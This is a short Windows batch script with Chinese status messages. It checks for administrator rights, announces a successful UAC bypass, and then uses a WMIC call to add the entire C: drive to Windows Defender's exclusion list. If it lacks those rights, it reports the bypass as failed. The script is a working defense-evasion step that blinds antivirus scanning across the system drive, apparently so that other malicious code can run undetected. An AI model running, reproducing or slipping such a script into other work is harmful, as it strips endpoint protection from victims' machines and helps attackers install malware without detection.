@echo off
REM 
chcp 65001
CLS
net.exe session 1>NUL 2>NUL && (
    goto as_admin
) || (
    goto not_admin
)

:as_admin
echo [+]UAC绕过成功,开始调用wmic调教Windows Defender
echo [*]正在把整个C盘添加进Windows Defender的白名单
wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="C:\"
echo [+]完毕
goto end

:not_admin
echo [-]UAC绕过失败

:end
pause